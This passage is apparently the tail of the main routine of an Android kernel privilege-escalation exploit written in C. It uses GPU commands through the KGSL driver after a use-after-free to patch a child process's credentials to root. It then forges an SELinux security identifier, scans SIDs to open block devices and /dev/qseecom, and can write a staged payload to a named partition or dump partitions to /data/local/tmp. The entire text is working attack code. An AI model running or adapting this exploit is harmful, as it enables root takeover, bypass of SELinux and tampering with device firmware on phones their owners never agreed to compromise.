        if (kgsl_ctx(fd, &ctx) < 0 ||
            kgsl_alloc(fd, IB_SIZE, &ib_id, &ib_gpu, &ib_vma, 0) < 0 ||
            kgsl_alloc(fd, KM_DUMP_BUFFER_SIZE, &dump_id, &dump_gpu,
                       &dump_vma, 0) < 0) {
            abandon_round(&fd, &ib_id, &ib_vma, &dump_id, &dump_vma);
            continue;
        }

        int found = find_task_candidates(
                fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                dump_id, dump_gpu, dump_vma, uaf_gpu, g_target,
                task_candidates, MAX_TASK_CANDIDATES,
                &task_candidate_count, 0);
        if (found < 0 && !getenv("KGSL_SCAN_FULL")) {
            fprintf(stderr,
                    "[*] fast scan found nothing; retrying with full scan\n");
            task_candidate_count = 0;
            found = find_task_candidates(
                    fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                    dump_id, dump_gpu, dump_vma, uaf_gpu, g_target,
                    task_candidates, MAX_TASK_CANDIDATES,
                    &task_candidate_count, 1);
        }
        if (found < 0) {
            fprintf(stderr, "[-] task_struct not found\n");
            abandon_round(&fd, &ib_id, &ib_vma, &dump_id, &dump_vma);
            continue;
        }
        mark("task candidates found");

        if (patch_any_child_credential(
                fd, ctx, ib_id, ib_gpu, ib_vma,
                dump_id, dump_gpu, dump_vma, uaf_gpu,
                task_candidates, task_candidate_count,
                &root_child, &selected_cred_alias) < 0) {
            fprintf(stderr,
                    "[-] no accessible child task_struct yielded root IDs\n");
            abandon_round(&fd, &ib_id, &ib_vma, &dump_id, &dump_vma);
            continue;
        }
        root_verified = 1;
    }
    if (!root_verified) {
        fprintf(stderr, "[-] root child not found after %ld rounds\n", rounds);
        kill_children_except(-1);
        return 1;
    }

    uint64_t forged_security = 0;
    if (sec_sid_mode || sec_perm_mode) {
        if (!g_target->task_group_leader ||
            (sec_sid_mode && (!g_target->task_security ||
                              !g_target->task_fake_sec ||
                              !selected_cred_alias))) {
            fprintf(stderr,
                    "[-] SEC_SID needs task_security/task_fake_sec/"
                    "task_group_leader and a cred alias\n");
            kill_children_except(-1);
            return 2;
        }
        /* root_child.page and the cred alias live in the KGSL object address
         * space. task->security needs a *kernel* virtual address, so take the
         * task_struct's own kernel address from task->group_leader (the child
         * is single threaded, so it points at itself). */
        uint32_t gl[2] = {0, 0};
        if (gpu_read_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                           dump_id, dump_gpu, dump_vma,
                           root_child.page + g_target->task_group_leader,
                           gl, 2) < 0) {
            perror("read task group_leader");
            kill_children_except(-1);
            return 1;
        }
        uint64_t group_leader = ((uint64_t)gl[1] << 32) | gl[0];
        if ((group_leader & 0xffff000000000000ULL) != 0xffff000000000000ULL ||
            (group_leader & 7ULL)) {
            fprintf(stderr, "[-] unexpected group_leader=%016llx\n",
                    (unsigned long long)group_leader);
            kill_children_except(-1);
            return 1;
        }
        root_task_kva = group_leader;
        printf("[*] root child task_struct kva=%016llx\n",
               (unsigned long long)group_leader);
        if (sec_sid_mode) {
            forged_security = group_leader + g_target->task_fake_sec;
            uint32_t sid_value = 1;
            {
                const char *sid_env = getenv("SEC_SID");
                if (sid_env && *sid_env >= '0' && *sid_env <= '9')
                    sid_value = (uint32_t)strtoul(sid_env, NULL, 0);
            }
            uint32_t ids[2] = {sid_value, sid_value};  /* osid = sid */
            printf("[*] forging SID %u\n", sid_value);
            uint32_t ptr[2] = {(uint32_t)forged_security,
                               (uint32_t)(forged_security >> 32)};
            if (gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                                root_child.page + g_target->task_fake_sec,
                                ids, 2) < 0 ||
                gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                                root_child.page + g_target->task_security,
                                ptr, 2) < 0 ||
                gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                                selected_cred_alias + g_target->cred_security,
                                ptr, 2) < 0) {
                perror("forge task_security_struct");
                kill_children_except(-1);
                return 1;
            }
            printf("[+] forged SID %u task_security_struct: kva=%016llx gpu=%016llx\n",
                   sid_value,
                   (unsigned long long)forged_security,
                   (unsigned long long)(root_child.page +
                                        g_target->task_fake_sec));
            ctrls[root_child.idx].sec_fake_addr = forged_security;
        }
    }

    printf("[*] reaping spray children after root verification\n");
    kill_children_except(root_child.idx);
    if (sec_sid_mode && getenv("SEC_WRITE") && g_dump_buf && g_dump_hdr) {
        /* stage the payload for the child: it lives in the shell domain and
         * cannot read /data/local/tmp once it has adopted another SID. */
        const char *wfile = getenv("SEC_WRITE_FILE");
        const char *wname = getenv("SEC_WRITE");
        int wfd = open(wfile ? wfile : "/data/local/tmp/sec_write.bin", O_RDONLY);
        long long len = 0;
        if (wfd >= 0) {
            struct stat st;
            if (fstat(wfd, &st) == 0 && st.st_size > 0 &&
                (size_t)st.st_size <= SEC_DUMP_SIZE) {
                len = (long long)read(wfd, g_dump_buf, (size_t)st.st_size);
            }
            close(wfd);
        }
        memset(g_dump_hdr, 0, sizeof(*g_dump_hdr));
        strncpy(g_dump_hdr->ent[0].name, wname ? wname : "", 15);
        g_dump_hdr->ent[0].name[15] = 0;
        g_dump_hdr->ent[0].offset = 0;
        g_dump_hdr->ent[0].size = len;
        printf("[*] staged %lld bytes for partition '%s'\n", len,
               wname ? wname : "");
    }
    uint64_t hijack_kaslr = 0;
    if (sec_perm_mode) {
        int trigger = env_flag("SEC_PERM_TRIGGER", 1);
        for (int arm = 0; arm < 3 && !hijack_kaslr; arm++) {
            hijack_kaslr = sec_perm_arm(fd, ctx, ib_id, ib_gpu, ib_vma,
                                        dump_id, dump_gpu, dump_vma,
                                        &root_child, root_task_kva, trigger);
            if (!hijack_kaslr && !trigger)
                break;
            if (!hijack_kaslr)
                usleep(1000);
        }
        if (!hijack_kaslr)
            fprintf(stderr,
                    "[-] permissive hijack not armed; child will resume"
                    " normally\n");
    }
    ctrls[root_child.idx].root_done = 0;
    ctrls[root_child.idx].error = 0;
    ctrls[root_child.idx].action = 1;
    __sync_synchronize();
    futex_wake_int(&ctrls[root_child.idx].action);
    if (wait_for_root_credentials(root_child.idx, 10000) < 0) {
        perror("verify target child credentials");
        kill(root_child.pid, SIGKILL);
        return 1;
    }
    printf("[+] child %d verified uid/euid/gid/egid 0\n", root_child.pid);
    mark("root verified");
    if (sec_perm_mode) sec_report_permissive(hijack_kaslr, root_child.pid);
    if (sec_sid_mode && getenv("SEC_SIDSCAN") && forged_security) {
        int blk = 0, qse = 0, ctl = 0;
        int scan_max = SEC_SID_SCAN_MAX;
        const char *want_ctx = getenv("SEC_WANT_CTX");
        char last_ctx[128] = {0};
        int matched = 0;
        if (getenv("SEC_SCAN_LIMIT")) {
            int v = atoi(getenv("SEC_SCAN_LIMIT"));
            if (v > 0 && v < scan_max) scan_max = v;
        }
        for (int cand = 1; cand <= scan_max && !blk && !matched; cand++) {
            ctrls[root_child.idx].sec_probe_result = -1;
            ctrls[root_child.idx].sec_probe_cand = cand;
            __sync_synchronize();
            ctrls[root_child.idx].sec_probe_ready = 1;
            int ok = -1;
            for (int w = 0; w < 500; w++) {
                __sync_synchronize();
                if (ctrls[root_child.idx].sec_probe_result >= 0) {
                    ok = ctrls[root_child.idx].sec_probe_result;
                    break;
                }
                usleep(10000);
            }
            if ((cand & 8191) == 0)
                printf("[scan] progress %d\n", cand);
            /* the child reports the context the current SID resolves to */
            __sync_synchronize();
            if (ctrls[root_child.idx].sec_ctx[0] &&
                strcmp(last_ctx, ctrls[root_child.idx].sec_ctx) != 0) {
                snprintf(last_ctx, sizeof(last_ctx), "%s",
                         ctrls[root_child.idx].sec_ctx);
                printf("[map] SID %d -> %s\n", cand, last_ctx);
                if (want_ctx && *want_ctx && strstr(last_ctx, want_ctx)) {
                    matched = cand;
                    printf("[+] SID %d matches wanted context %s\n", cand,
                           want_ctx);
                }
            }
            if (ok <= 0)
                continue;
            int want = getenv("SEC_CGMOVE") ? 0x03 : 0x0f;
            int ctlbits = getenv("SEC_CGMOVE") ? 0x04 : 0x3c;
            if ((ok & ctlbits) && !ctl) {
                ctl = cand;
                printf("[ctl] SID %d mask=0x%x\n", cand, ok);
            }
            if ((ok & want) && !blk) {
                blk = cand;
                printf("[+] SID %d usable mask=0x%x\n", cand, ok);
            }
            if (!getenv("SEC_CGMOVE") && (ok & 0x02) && !qse) {
                qse = cand;
                printf("[+] SID %d opens /dev/qseecom\n", cand);
            }
        }
        int final = matched ? matched : (blk ? blk : (qse ? qse : 1));
        uint32_t final_ids[2] = {(uint32_t)final, (uint32_t)final};
        (void)gpu_write_words(fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
                              forged_security, final_ids, 2);
        __sync_synchronize();
        if (matched) {
            /* re-probe with the wanted SID applied and report every errno */
            ctrls[root_child.idx].sec_probe_result = -1;
            ctrls[root_child.idx].sec_probe_ready = 1;
            int ok = -1;
            for (int w = 0; w < 500; w++) {
                __sync_synchronize();
                if (ctrls[root_child.idx].sec_probe_result >= 0) {
                    ok = ctrls[root_child.idx].sec_probe_result;
                    break;
                }
                usleep(10000);
            }
            static const char *probe_paths[] = {
                "/dev/sg0", "/dev/block/sda",
                "/dev/block/by-name/abl_a", "/dev/block/by-name/xbl_a",
                "/dev/qseecom", "/sys/fs/selinux/load",
                "/dev/block/sda1", "/dev/block/sda6", "/dev/block/sda40",
                "/dev/block/sda52", "/dev/binder", NULL};
            printf("[probe] final SID %d mask=0x%x ctx=%s\n", final, ok,
                   ctrls[root_child.idx].sec_ctx);
            for (int pi = 0; probe_paths[pi] && pi < 11; pi++)
                printf("[probe] %-28s errno=%d\n", probe_paths[pi],
                       ctrls[root_child.idx].sec_errno[pi]);
        }
        ctrls[root_child.idx].sec_scan_stop = 1;
        printf("[scan] control=%d block=%d qseecom=%d final=%d matched=%d\n",
               ctl, blk, qse, final, matched);
        if (g_sec_log && *g_sec_log)
            printf("[child log]\n%s\n", g_sec_log);
        if (!blk)
            printf("[-] no SID in 1..%d could open a block device\n", scan_max);
    }

    if (sec_sid_mode && getenv("SEC_WRITE") && g_dump_hdr) {
        int waited = 0;
        while (ctrls[root_child.idx].sec_errno[3] != 0x5e7e && waited < 120000) {
            usleep(50000);
            waited += 50;
        }
        if (ctrls[root_child.idx].sec_errno[3] != 0x5e7e) {
            printf("[-] write stage did not report back\n");
        } else {
            printf("[write] result=%d bytes=%d off=%d\n",
                   ctrls[root_child.idx].sec_errno[0],
                   ctrls[root_child.idx].sec_errno[1],
                   ctrls[root_child.idx].sec_errno[2]);
        }
        if (g_sec_log && *g_sec_log)
            printf("[child log]\n%s\n", g_sec_log);
    }

    if (sec_sid_mode && getenv("SEC_DUMP2") && g_dump_hdr) {
        int waited = 0;
        while (!g_dump_hdr->done && waited < 180000) {
            usleep(50000);
            waited += 50;
        }
        if (g_sec_log && *g_sec_log)
            printf("[child log]\n%s\n", g_sec_log);
        if (!g_dump_hdr->done) {
            printf("[-] partition dump did not complete\n");
        } else {
            int dfd = open("/data/local/tmp/dump_all.bin",
                           O_WRONLY | O_CREAT | O_TRUNC, 0644);
            if (dfd >= 0) {
                (void)!write(dfd, g_dump_buf, SEC_DUMP_SIZE);
                close(dfd);
            }
            int mf = open("/data/local/tmp/dump_all.txt",
                          O_WRONLY | O_CREAT | O_TRUNC, 0644);
            for (int i = 0; i < g_dump_hdr->count; i++) {
                char line[128];
                int n = snprintf(line, sizeof line, "%s %lld %lld\n",
                                 g_dump_hdr->ent[i].name,
                                 g_dump_hdr->ent[i].offset,
                                 g_dump_hdr->ent[i].size);
                if (n > 0) {
                    if (mf >= 0) (void)!write(mf, line, (size_t)n);
                    printf("[dump] %s", line);
                }
            }
            if (mf >= 0) close(mf);
            printf("[+] dump written (%d partitions)\n", g_dump_hdr->count);
        }
    }

    int status = 0;
    while (waitpid(root_child.pid, &status, 0) < 0 && errno == EINTR) {}
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        printf("[+] root child finished\n");
        mark("root child finished");
        return 0;
    }
    fprintf(stderr, "[-] root child exited status=%d\n", status);
    return 1;
}
